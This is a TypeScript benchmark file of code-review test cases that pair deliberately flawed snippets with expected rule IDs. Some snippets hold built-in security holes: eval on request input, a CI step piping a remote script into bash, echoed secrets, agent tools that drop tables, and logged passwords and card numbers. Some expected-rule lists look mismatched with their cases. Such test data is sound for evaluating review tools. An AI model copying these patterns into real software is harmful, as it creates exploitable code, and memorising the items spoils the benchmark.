/**
 * Advanced benchmark cases — cross-cutting coverage for under-represented
 * judges, categories, and difficulty levels.
 *
 * Focus areas:
 *   - Hallucination detection (HALLU) — 0 prior coverage
 *   - Under-covered categories: code-structure, data-sovereignty, agent-instructions,
 *     ethics-bias, logging-privacy, ci-cd, backwards-compatibility, documentation,
 *     cloud-readiness, api-design, software-practices, data-security, observability
 *   - Under-covered judges: DOC, STRUCT, LOGPRIV, OBS, PORTA, SOV, API, CACHE
 *   - Hard-difficulty cases to raise the hard/easy ratio
 */

import type { BenchmarkCase } from "./benchmark.js";

export const BENCHMARK_ADVANCED_CASES: BenchmarkCase[] = [
  // ═══════════════════════════════════════════════════════════════════════════
  // HALLUCINATION DETECTION — zero prior coverage
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "hallu-node-fs-readFileAsync",
    description: "Uses non-existent Node.js fs.readFileAsync method",
    language: "typescript",
    code: `import fs from "fs";

async function loadConfig(path: string) {
  const data = await fs.readFileAsync(path, "utf-8");
  return JSON.parse(data);
}`,
    expectedRuleIds: ["HALLU-001"],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-crypto-hash-method",
    description: "Uses non-existent crypto.hash() shorthand",
    language: "typescript",
    code: `import crypto from "crypto";

function hashPassword(password: string): string {
  return crypto.hash("sha256", password);
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-array-flat-callback",
    description: "Uses Array.flat with callback — does not exist",
    language: "javascript",
    code: `const nested = [[1, 2], [3, [4, 5]]];
const result = nested.flat(item => item * 2);
console.log(result);`,
    expectedRuleIds: ["HALLU-001"],
    category: "hallucination-detection",
    difficulty: "easy",
  },
  {
    id: "hallu-python-fastapi-oauth2",
    description: "Imports non-existent fastapi.security.oauth2 submodule",
    language: "python",
    code: `from fastapi.security.oauth2 import OAuth2PasswordBearerWithScopes

app = FastAPI()

oauth2_scheme = OAuth2PasswordBearerWithScopes(tokenUrl="token", scopes={"read": "Read"})

@app.get("/users/me")
async def read_users_me(token: str = Depends(oauth2_scheme)):
    return decode_token(token)`,
    expectedRuleIds: ["CYBER-001", "UX-001"],
    category: "hallucination-detection",
    difficulty: "hard",
  },
  {
    id: "hallu-js-string-contains",
    description: "Uses String.contains() — not a JS method (Java confusion)",
    language: "javascript",
    code: `function searchUsers(users, query) {
  return users.filter(u => u.name.contains(query));
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "easy",
  },
  {
    id: "hallu-python-os-makedirs-exist",
    description: "Uses os.makedirs with non-existent 'permissions' parameter",
    language: "python",
    code: `import os

def ensure_dir(path):
    os.makedirs(path, exist_ok=True, permissions=0o755)`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-go-nonexistent-stdlib",
    description: "Imports non-existent Go stdlib package",
    language: "go",
    code: `package main

import (
    "fmt"
    "net/security"
)

func main() {
    token := security.GenerateCSRFToken()
    fmt.Println(token)
}`,
    expectedRuleIds: ["DATA-001", "CYBER-001", "OBS-001", "COMP-001"],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-rust-phantom-crate",
    description: "Uses a fabricated Rust crate name",
    language: "rust",
    code: `use secure_random::SecureRandom;

fn generate_token() -> String {
    let rng = SecureRandom::new();
    rng.generate_hex(32)
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "hard",
  },
  {
    id: "hallu-python-requests-async",
    description: "Uses requests.async_get — requests has no async API",
    language: "python",
    code: `import requests

async def fetch_data(url):
    response = await requests.async_get(url, timeout=30)
    return response.json()`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-node-buffer-from-stream",
    description: "Uses Buffer.fromStream — not a real Node API",
    language: "typescript",
    code: `import { createReadStream } from "fs";

async function readFile(path: string): Promise<Buffer> {
  const stream = createReadStream(path);
  return Buffer.fromStream(stream);
}`,
    expectedRuleIds: ["SCALE-001", "UX-001"],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-java-list-stream-toArray",
    description: "Uses List.stream().toArray(String::new) — wrong API signature",
    language: "java",
    code: `import java.util.List;

public class Utils {
    public static String[] toArray(List<String> items) {
        return items.stream().toArray(String::new);
    }
}`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "hard",
  },
  {
    id: "hallu-python-json-loads-file",
    description: "Uses json.loads on a file path — should be json.load with file handle",
    language: "python",
    code: `import json

def load_config(path):
    data = json.loads(path)
    return data["database"]`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CODE-STRUCTURE — only 1 prior case
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "struct-deeply-nested-conditionals-py",
    description: "Python function with 7+ levels of nested conditionals",
    language: "python",
    code: `def process_order(order, user, config):
    if order:
        if order.status == "pending":
            if user:
                if user.is_active:
                    if config.get("allow_processing"):
                        if order.total > 0:
                            if order.items:
                                if len(order.items) < config.get("max_items", 100):
                                    return process(order)
    return None`,
    expectedRuleIds: [],
    category: "code-structure",
    difficulty: "easy",
  },
  {
    id: "struct-god-class-java",
    description: "Java class with too many responsibilities",
    language: "java",
    code: `public class ApplicationManager {
    private Database db;
    private EmailService email;
    private Logger logger;
    private CacheManager cache;
    private FileStorage storage;
    private PaymentGateway payments;
    private NotificationService notifications;
    private AuthService auth;
    private ReportGenerator reports;
    private SchedulerService scheduler;

    public void processOrder(Order order) { /* 50 lines */ }
    public void sendInvoice(Invoice inv) { /* 30 lines */ }
    public void generateReport(String type) { /* 40 lines */ }
    public void handlePayment(Payment p) { /* 35 lines */ }
    public void sendNotification(String msg) { /* 20 lines */ }
    public void backupDatabase() { /* 25 lines */ }
    public void clearCache() { /* 15 lines */ }
    public void uploadFile(File f) { /* 30 lines */ }
    public void authenticateUser(String u, String p) { /* 40 lines */ }
    public void scheduleTask(Task t) { /* 20 lines */ }
}`,
    expectedRuleIds: ["DATA-001", "COMP-001", "SOV-001", "DOC-001"],
    category: "code-structure",
    difficulty: "medium",
  },
  {
    id: "struct-deep-callback-hell-js",
    description: "JavaScript callback hell with deeply nested anonymous functions",
    language: "javascript",
    code: `function loadDashboard(userId) {
  getUser(userId, function(err, user) {
    if (!err) {
      getOrders(user.id, function(err, orders) {
        if (!err) {
          getPayments(user.id, function(err, payments) {
            if (!err) {
              getNotifications(user.id, function(err, notifs) {
                if (!err) {
                  getPreferences(user.id, function(err, prefs) {
                    if (!err) {
                      render(user, orders, payments, notifs, prefs);
                    }
                  });
                }
              });
            }
          });
        }
      });
    }
  });
}`,
    expectedRuleIds: ["STRUCT-001"],
    category: "code-structure",
    difficulty: "easy",
  },
  {
    id: "struct-spaghetti-switch-ts",
    description: "TypeScript function with massive switch statement and duplicated logic",
    language: "typescript",
    code: `function handleEvent(type: string, data: any) {
  switch (type) {
    case "click": console.log("click"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "hover": console.log("hover"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "scroll": console.log("scroll"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "resize": console.log("resize"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "keypress": console.log("keypress"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "focus": console.log("focus"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "blur": console.log("blur"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    case "submit": console.log("submit"); fetch("/track", { method: "POST", body: JSON.stringify({ type, data, ts: Date.now() }) }); break;
    default: break;
  }
}`,
    expectedRuleIds: ["STRUCT-001", "MAINT-001"],
    category: "code-structure",
    difficulty: "medium",
  },
  {
    id: "struct-long-parameter-list-go",
    description: "Go function with excessive parameters instead of a struct",
    language: "go",
    code: `package service

func CreateUser(
    firstName string, lastName string, email string,
    phone string, address string, city string,
    state string, zip string, country string,
    role string, department string, manager string,
    startDate string, salary float64, currency string,
) error {
    // All logic with 15 parameters threaded through
    return nil
}`,
    expectedRuleIds: [],
    category: "code-structure",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // DATA-SOVEREIGNTY — only 2 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "sov-cross-region-replication-ts",
    description: "Database replication across regions without data residency check",
    language: "typescript",
    code: `const replicationConfig = {
  primary: { region: "eu-west-1", endpoint: "db-eu.example.com" },
  replicas: [
    { region: "us-east-1", endpoint: "db-us.example.com" },
    { region: "ap-southeast-1", endpoint: "db-ap.example.com" },
  ],
};

async function replicateData(records: any[]) {
  for (const replica of replicationConfig.replicas) {
    await fetch(replica.endpoint + "/replicate", {
      method: "POST",
      body: JSON.stringify(records),
    });
  }
}`,
    expectedRuleIds: ["SOV-001", "SOV-002"],
    category: "data-sovereignty",
    difficulty: "hard",
  },
  {
    id: "sov-gdpr-data-export-py",
    description: "Data export endpoint without jurisdiction or residency checks",
    language: "python",
    code: `from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route("/api/users/export", methods=["GET"])
def export_user_data():
    user_id = request.args.get("user_id")
    user = db.query("SELECT * FROM users WHERE id = %s", (user_id,))
    orders = db.query("SELECT * FROM orders WHERE user_id = %s", (user_id,))
    # Exports PII without checking data residency requirements
    return jsonify({"user": user, "orders": orders, "exported_at": datetime.utcnow().isoformat()})`,
    expectedRuleIds: ["SOV-001", "DATA-001"],
    category: "data-sovereignty",
    difficulty: "medium",
  },
  {
    id: "sov-analytics-third-party-js",
    description: "Sends user analytics to third-party without consent or residency check",
    language: "javascript",
    code: `function initAnalytics(userId) {
  const payload = {
    userId,
    ip: getUserIP(),
    location: getGeoLocation(),
    browser: navigator.userAgent,
    pages: getVisitedPages(),
  };
  fetch("https://analytics.third-party.com/collect", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}`,
    expectedRuleIds: ["SOV-001", "DATA-001"],
    category: "data-sovereignty",
    difficulty: "medium",
  },
  {
    id: "sov-cloud-storage-no-region-go",
    description: "Cloud storage upload without specifying region or data residency",
    language: "go",
    code: `package storage

import (
    "context"
    "cloud.google.com/go/storage"
)

func UploadUserDocument(ctx context.Context, bucket, name string, data []byte) error {
    client, _ := storage.NewClient(ctx)
    defer client.Close()
    wc := client.Bucket(bucket).Object(name).NewWriter(ctx)
    wc.Write(data)
    return wc.Close()
}`,
    expectedRuleIds: ["DATA-001", "ERR-001"],
    category: "data-sovereignty",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // AGENT-INSTRUCTIONS — only 2 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "agent-unrestricted-tool-access-ts",
    description: "AI agent with unrestricted tool access and no validation",
    language: "typescript",
    code: `const agent = new AIAgent({
  systemPrompt: "You are a helpful assistant. You can use any tool available.",
  tools: getAllTools(),
  maxIterations: 100,
});

async function handleUserRequest(userMessage: string) {
  const result = await agent.run(userMessage);
  return result.output;
}`,
    expectedRuleIds: [],
    category: "agent-instructions",
    difficulty: "medium",
  },
  {
    id: "agent-system-prompt-injection-py",
    description: "System prompt constructed from user input — prompt injection vector",
    language: "python",
    code: `def create_agent(user_role, user_instructions):
    system_prompt = f"""You are an AI assistant for {user_role}.
    Follow these custom instructions: {user_instructions}
    You have access to: database queries, file operations, email sending."""
    return Agent(system_prompt=system_prompt, tools=all_tools)`,
    expectedRuleIds: [],
    category: "agent-instructions",
    difficulty: "hard",
  },
  {
    id: "agent-no-output-sanitization-js",
    description: "Agent output rendered directly in HTML without sanitization",
    language: "javascript",
    code: `async function chatWithAgent(userMessage) {
  const response = await agent.complete(userMessage);
  document.getElementById("chat-output").innerHTML = response.text;
}`,
    expectedRuleIds: ["AGENT-001", "CYBER-001"],
    category: "agent-instructions",
    difficulty: "easy",
  },
  {
    id: "agent-tool-no-confirm-ts",
    description: "Agent executes destructive tools without user confirmation",
    language: "typescript",
    code: `const tools = {
  deleteUser: async (userId: string) => db.query("DELETE FROM users WHERE id = $1", [userId]),
  dropTable: async (table: string) => db.query(\`DROP TABLE \${table}\`),
  sendEmail: async (to: string, body: string) => mailer.send(to, body),
};

const agent = new Agent({
  tools,
  confirmBeforeExecution: false,
  systemPrompt: "Execute any tool the user requests immediately.",
});`,
    expectedRuleIds: ["AGENT-001", "CYBER-001"],
    category: "agent-instructions",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // ETHICS-BIAS — only 2 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "ethics-gender-pay-gap-py",
    description: "Salary calculation that varies by gender",
    language: "python",
    code: `def calculate_salary(base_rate, experience_years, gender):
    salary = base_rate * (1 + 0.03 * experience_years)
    if gender == "male":
        salary *= 1.15
    elif gender == "female":
        salary *= 0.95
    return salary`,
    expectedRuleIds: ["ETHICS-001"],
    category: "ethics-bias",
    difficulty: "easy",
  },
  {
    id: "ethics-age-filtering-ts",
    description: "Service filtering users by age for non-safety-related features",
    language: "typescript",
    code: `function getEligibleUsers(users: User[]): User[] {
  return users.filter(u => {
    if (u.age > 55) return false;
    if (u.age < 22) return false;
    return true;
  });
}`,
    expectedRuleIds: [],
    category: "ethics-bias",
    difficulty: "medium",
  },
  {
    id: "ethics-biased-training-data-py",
    description: "ML model trained on biased dataset without debiasing",
    language: "python",
    code: `import pandas as pd
from sklearn.ensemble import RandomForestClassifier

def train_loan_model():
    df = pd.read_csv("historical_loans.csv")
    features = ["income", "credit_score", "zip_code", "race", "gender"]
    X = df[features]
    y = df["approved"]
    model = RandomForestClassifier()
    model.fit(X, y)
    return model`,
    expectedRuleIds: [],
    category: "ethics-bias",
    difficulty: "hard",
  },
  {
    id: "ethics-location-pricing-js",
    description: "Dynamic pricing based on user location / country of origin",
    language: "javascript",
    code: `function calculatePrice(product, user) {
  let price = product.basePrice;
  const wealthyCountries = ["US", "CH", "NO", "DK", "AU"];
  if (wealthyCountries.includes(user.country)) {
    price *= 1.8;
  }
  if (user.previousPurchases > 10) {
    price *= 1.2; // charge loyal customers more
  }
  return price;
}`,
    expectedRuleIds: [],
    category: "ethics-bias",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // LOGGING-PRIVACY — only 3 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "logpriv-pii-in-debug-logs-ts",
    description: "Logs full user objects with PII in debug mode",
    language: "typescript",
    code: `import { logger } from "./logger";

async function authenticateUser(email: string, password: string) {
  logger.debug("Auth attempt", { email, password });
  const user = await db.findUser(email);
  logger.info("User found", { user });
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    logger.info("Login successful", { userId: user.id, ssn: user.ssn, dob: user.dateOfBirth });
    return generateToken(user);
  }
  logger.warn("Login failed", { email, password, attemptedAt: new Date() });
  return null;
}`,
    expectedRuleIds: ["LOGPRIV-001", "DATA-001"],
    category: "logging-privacy",
    difficulty: "easy",
  },
  {
    id: "logpriv-credit-card-in-logs-py",
    description: "Logs credit card numbers in payment processing",
    language: "python",
    code: `import logging

logger = logging.getLogger(__name__)

def process_payment(card_number, cvv, amount, expiry):
    logger.info(f"Processing payment: card={card_number}, cvv={cvv}, amount={amount}")
    result = gateway.charge(card_number, cvv, amount, expiry)
    logger.info(f"Payment result: {result}, card={card_number}")
    return result`,
    expectedRuleIds: ["LOGPRIV-001", "DATA-001"],
    category: "logging-privacy",
    difficulty: "easy",
  },
  {
    id: "logpriv-token-in-error-logs-go",
    description: "Logs authentication tokens in error handling",
    language: "go",
    code: `package auth

import "log"

func ValidateToken(token string) (*Claims, error) {
    claims, err := jwt.Parse(token, keyFunc)
    if err != nil {
        log.Printf("Token validation failed: token=%s, error=%v", token, err)
        return nil, err
    }
    log.Printf("Token validated successfully: token=%s, user=%s", token, claims.Subject)
    return claims, nil
}`,
    expectedRuleIds: ["DATA-001", "CYBER-001"],
    category: "logging-privacy",
    difficulty: "easy",
  },
  {
    id: "logpriv-health-records-logging-java",
    description: "Logs patient health records violating HIPAA",
    language: "java",
    code: `public class PatientService {
    private static final Logger logger = LoggerFactory.getLogger(PatientService.class);

    public PatientRecord getPatientRecord(String patientId) {
        PatientRecord record = repository.findById(patientId);
        logger.info("Retrieved patient record: {}", record);
        logger.debug("Patient details - SSN: {}, diagnosis: {}, medications: {}",
            record.getSsn(), record.getDiagnosis(), record.getMedications());
        return record;
    }
}`,
    expectedRuleIds: ["LOGPRIV-001", "COMP-001", "DATA-001"],
    category: "logging-privacy",
    difficulty: "medium",
  },
  {
    id: "logpriv-request-body-dump-ts",
    description: "Express middleware that logs entire request bodies including secrets",
    language: "typescript",
    code: `import express from "express";

const app = express();

app.use((req, res, next) => {
  console.log("Request:", req.method, req.url);
  console.log("Headers:", JSON.stringify(req.headers));
  console.log("Body:", JSON.stringify(req.body));
  console.log("Cookies:", JSON.stringify(req.cookies));
  next();
});`,
    expectedRuleIds: ["LOGPRIV-001", "DATA-001"],
    category: "logging-privacy",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CI-CD — only 3 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "cicd-secrets-in-workflow-yaml",
    description: "GitHub Actions workflow that echoes secrets to logs",
    language: "yaml",
    code: `name: Deploy
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Debug credentials
        run: |
          echo "API_KEY=\${{ secrets.API_KEY }}"
          echo "DB_PASSWORD=\${{ secrets.DB_PASSWORD }}"
          curl -X POST https://deploy.example.com/deploy \\
            -H "Authorization: Bearer \${{ secrets.DEPLOY_TOKEN }}"`,
    expectedRuleIds: [],
    category: "ci-cd",
    difficulty: "easy",
  },
  {
    id: "cicd-no-pinned-actions-yaml",
    description: "GitHub Actions using unpinned third-party actions",
    language: "yaml",
    code: `name: CI
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - uses: some-org/untrusted-action@master
      - uses: random-user/deploy-action@latest
      - run: npm test`,
    expectedRuleIds: [],
    category: "ci-cd",
    difficulty: "medium",
  },
  {
    id: "cicd-privileged-container-build-yaml",
    description: "CI pipeline running with privileged Docker containers",
    language: "yaml",
    code: `name: Build
on: push

jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:18
      options: --privileged
    services:
      db:
        image: postgres:latest
        options: --privileged
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test`,
    expectedRuleIds: ["CICD-001", "SEC-001"],
    category: "ci-cd",
    difficulty: "medium",
  },
  {
    id: "cicd-artifact-no-integrity-yaml",
    description: "CI pipeline downloading artifacts without checksum verification",
    language: "yaml",
    code: `name: Release
on:
  push:
    tags: ['v*']

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://github.com/example/tool/releases/latest/download/tool.tar.gz | tar xz
      - run: ./tool deploy --production
      - run: curl -sSL https://install.example.com | bash`,
    expectedRuleIds: ["SOV-001"],
    category: "ci-cd",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // BACKWARDS-COMPATIBILITY — only 3 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "compat-removed-method-signature-ts",
    description: "Public API method renamed without providing a deprecated alias",
    language: "typescript",
    code: `// v1: getUserById(id: string): Promise<User>
// v2: completely removed, replaced by:
export async function fetchUser(id: string, options?: FetchOptions): Promise<User> {
  return db.users.findUnique({ where: { id }, ...options });
}
// No backward-compatible alias, no deprecation notice`,
    expectedRuleIds: [],
    category: "backwards-compatibility",
    difficulty: "medium",
  },
  {
    id: "compat-changed-return-type-py",
    description: "Public function silently changes return type from list to generator",
    language: "python",
    code: `# Previously returned List[dict] — now returns generator
# Callers doing len(get_items()) or get_items()[0] will break
def get_items(category):
    for item in db.query("SELECT * FROM items WHERE category = %s", (category,)):
        yield item`,
    expectedRuleIds: ["CYBER-001", "DB-001", "SEC-001"],
    category: "backwards-compatibility",
    difficulty: "hard",
  },
  {
    id: "compat-api-field-rename-ts",
    description: "REST API renames response field without versioning",
    language: "typescript",
    code: `// v1 response: { "userName": "alice", "userEmail": "alice@example.com" }
// v2 response: { "name": "alice", "email": "alice@example.com" }
// No v1 backward compatibility, no API versioning
app.get("/api/users/:id", async (req, res) => {
  const user = await db.users.findById(req.params.id);
  res.json({ name: user.name, email: user.email });
});`,
    expectedRuleIds: ["UX-001"],
    category: "backwards-compatibility",
    difficulty: "medium",
  },
  {
    id: "compat-dropped-optional-param-java",
    description: "Java method removes an optional parameter breaking existing callers",
    language: "java",
    code: `public class SearchService {
    // v1: public List<Result> search(String query, int limit, String sortBy)
    // v2: removed sortBy parameter entirely
    public List<Result> search(String query, int limit) {
        return repository.search(query, limit, "relevance");
    }
}`,
    expectedRuleIds: [],
    category: "backwards-compatibility",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // DOCUMENTATION — only 4 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "doc-undocumented-public-api-ts",
    description: "TypeScript library exporting complex functions without JSDoc",
    language: "typescript",
    code: `export function t(k: string, p?: Record<string, unknown>, l?: string): string {
  const m = msgs[l || defaultLocale];
  if (!m || !m[k]) return k;
  return Object.entries(p || {}).reduce((s, [a, b]) => s.replace(\`{\${a}}\`, String(b)), m[k]);
}

export function f(n: number, c?: string, d?: number): string {
  return new Intl.NumberFormat(c || "en-US", { minimumFractionDigits: d || 2, maximumFractionDigits: d || 2 }).format(n);
}

export function d(v: Date | string, fmt?: string, tz?: string): string {
  const dt = typeof v === "string" ? new Date(v) : v;
  return new Intl.DateTimeFormat("en-US", { timeZone: tz }).format(dt);
}`,
    expectedRuleIds: ["DOC-001"],
    category: "documentation",
    difficulty: "medium",
  },
  {
    id: "doc-missing-module-docs-py",
    description: "Python module with no module docstring and undocumented classes",
    language: "python",
    code: `import hashlib
import hmac
import base64
from typing import Optional

class TokenManager:
    def __init__(self, secret: str, algorithm: str = "sha256"):
        self._secret = secret
        self._algorithm = algorithm

    def create(self, payload: dict, ttl: Optional[int] = None) -> str:
        data = json.dumps(payload)
        sig = hmac.new(self._secret.encode(), data.encode(), self._algorithm).hexdigest()
        return base64.b64encode(f"{data}.{sig}".encode()).decode()

    def verify(self, token: str) -> Optional[dict]:
        decoded = base64.b64decode(token).decode()
        data, sig = decoded.rsplit(".", 1)
        expected = hmac.new(self._secret.encode(), data.encode(), self._algorithm).hexdigest()
        if hmac.compare_digest(sig, expected):
            return json.loads(data)
        return None`,
    expectedRuleIds: [],
    category: "documentation",
    difficulty: "easy",
  },
  {
    id: "doc-complex-config-no-docs-ts",
    description: "Complex configuration interface with no property documentation",
    language: "typescript",
    code: `export interface PipelineConfig {
  stages: Array<{ name: string; handler: string; retries: number; timeout: number; backoff: string; dlq?: string; concurrency: number; batchSize: number; filters: Record<string, unknown>; transforms: string[]; validators: string[]; hooks: { pre?: string; post?: string; error?: string }; }>;
  globalTimeout: number;
  errorPolicy: "stop" | "skip" | "retry" | "dlq";
  metrics: { enabled: boolean; prefix: string; tags: Record<string, string>; interval: number; };
  logging: { level: string; format: string; destination: string; };
}`,
    expectedRuleIds: [],
    category: "documentation",
    difficulty: "medium",
  },
  {
    id: "doc-undocumented-go-package",
    description: "Go package with exported functions and no godoc comments",
    language: "go",
    code: `package middleware

import "net/http"

func RateLimit(rpm int) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // rate limiting logic
            next.ServeHTTP(w, r)
        })
    }
}

func CORS(origins []string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // CORS logic
            next.ServeHTTP(w, r)
        })
    }
}

func Auth(validator func(string) bool) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // auth logic
            next.ServeHTTP(w, r)
        })
    }
}`,
    expectedRuleIds: [],
    category: "documentation",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CLOUD-READINESS — only 4 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "cloud-hardcoded-file-path-py",
    description: "Python service writing to hardcoded local filesystem paths",
    language: "python",
    code: `def save_upload(file_data, filename):
    path = f"/var/data/uploads/{filename}"
    with open(path, "wb") as f:
        f.write(file_data)
    return path

def load_config():
    with open("/etc/myapp/config.yaml", "r") as f:
        return yaml.safe_load(f)

def write_log(message):
    with open("/var/log/myapp/application.log", "a") as f:
        f.write(f"{datetime.now()}: {message}\\n")`,
    expectedRuleIds: ["DATA-001", "PERF-001", "ERR-001"],
    category: "cloud-readiness",
    difficulty: "easy",
  },
  {
    id: "cloud-hardcoded-port-and-host-go",
    description: "Go server with hardcoded host and port, no env config",
    language: "go",
    code: `package main

import (
    "log"
    "net/http"
)

func main() {
    http.HandleFunc("/api/health", healthHandler)
    http.HandleFunc("/api/users", usersHandler)
    log.Println("Starting server on 192.168.1.100:3000")
    log.Fatal(http.ListenAndServe("192.168.1.100:3000", nil))
}`,
    expectedRuleIds: ["ERR-001", "REL-001", "CICD-001"],
    category: "cloud-readiness",
    difficulty: "easy",
  },
  {
    id: "cloud-local-session-storage-ts",
    description: "Express app storing sessions in local memory instead of external store",
    language: "typescript",
    code: `import express from "express";
import session from "express-session";

const app = express();

app.use(session({
  secret: "keyboard-cat",
  resave: false,
  saveUninitialized: true,
  // No external store — uses default MemoryStore
  // Will lose sessions on restart, won't work with multiple instances
}));

const uploadCache = new Map<string, Buffer>();
const rateLimitMap = new Map<string, number>();`,
    expectedRuleIds: ["CLOUD-001", "SCALE-001"],
    category: "cloud-readiness",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // API-DESIGN — only 4 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "api-no-pagination-ts",
    description: "REST endpoint returning unbounded collection without pagination",
    language: "typescript",
    code: `app.get("/api/users", async (req, res) => {
  const users = await db.query("SELECT * FROM users");
  res.json(users);
});

app.get("/api/orders", async (req, res) => {
  const orders = await db.query("SELECT * FROM orders");
  res.json(orders);
});

app.get("/api/logs", async (req, res) => {
  const logs = await db.query("SELECT * FROM audit_logs");
  res.json(logs);
});`,
    expectedRuleIds: ["API-001"],
    category: "api-design",
    difficulty: "easy",
  },
  {
    id: "api-no-versioning-express-ts",
    description: "Express API with no versioning strategy",
    language: "typescript",
    code: `import express from "express";

const app = express();

app.get("/users", getUsers);
app.post("/users", createUser);
app.get("/users/:id", getUser);
app.put("/users/:id", updateUser);
app.delete("/users/:id", deleteUser);

app.get("/products", getProducts);
app.post("/products", createProduct);
app.get("/orders", getOrders);
app.post("/orders", createOrder);

app.listen(3000);`,
    expectedRuleIds: ["API-001"],
    category: "api-design",
    difficulty: "easy",
  },
  {
    id: "api-inconsistent-error-responses-py",
    description: "API returns inconsistent error response formats",
    language: "python",
    code: `@app.route("/api/users/<user_id>")
def get_user(user_id):
    user = db.get_user(user_id)
    if not user:
        return "User not found", 404  # plain text
    return jsonify(user)

@app.route("/api/orders/<order_id>")
def get_order(order_id):
    order = db.get_order(order_id)
    if not order:
        return jsonify({"error": True, "message": "Not found"}), 404  # JSON with error flag
    return jsonify(order)

@app.route("/api/products/<product_id>")
def get_product(product_id):
    product = db.get_product(product_id)
    if not product:
        return jsonify({"status": 404, "detail": "Product not found"}), 404  # different JSON format
    return jsonify(product)`,
    expectedRuleIds: [],
    category: "api-design",
    difficulty: "medium",
  },
  {
    id: "api-no-input-validation-ts",
    description: "Express routes accepting request body without schema validation",
    language: "typescript",
    code: `app.post("/api/users", async (req, res) => {
  const user = await db.users.create(req.body);
  res.json(user);
});

app.put("/api/users/:id", async (req, res) => {
  const user = await db.users.update(req.params.id, req.body);
  res.json(user);
});

app.post("/api/orders", async (req, res) => {
  const order = await db.orders.create(req.body);
  res.json(order);
});`,
    expectedRuleIds: ["API-001", "CYBER-001"],
    category: "api-design",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // SOFTWARE-PRACTICES — only 4 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "swdev-no-error-types-ts",
    description: "TypeScript code using any for all error types",
    language: "typescript",
    code: `async function processData(input: any): Promise<any> {
  try {
    const result: any = await transform(input);
    const validated: any = validate(result);
    const output: any = await save(validated);
    return output;
  } catch (err: any) {
    console.log(err);
    return null;
  }
}

function transform(data: any): any {
  return data;
}

function validate(data: any): any {
  return data;
}`,
    expectedRuleIds: ["PERF-001", "AICS-001"],
    category: "software-practices",
    difficulty: "easy",
  },
  {
    id: "swdev-eslint-disable-everywhere-ts",
    description: "Code littered with eslint-disable comments suppressing real issues",
    language: "typescript",
    code: `/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable no-console */
// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-ignore
export function processRequest(req: any, res: any) {
  // eslint-disable-next-line no-eval
  const result = eval(req.body.expression);
  // eslint-disable-next-line @typescript-eslint/no-unsafe-assignment
  const data: any = result;
  // eslint-disable-next-line @typescript-eslint/no-unsafe-call
  data.execute();
  // eslint-disable-next-line @typescript-eslint/no-unsafe-return
  return data;
}`,
    expectedRuleIds: ["SWDEV-001", "CYBER-001"],
    category: "software-practices",
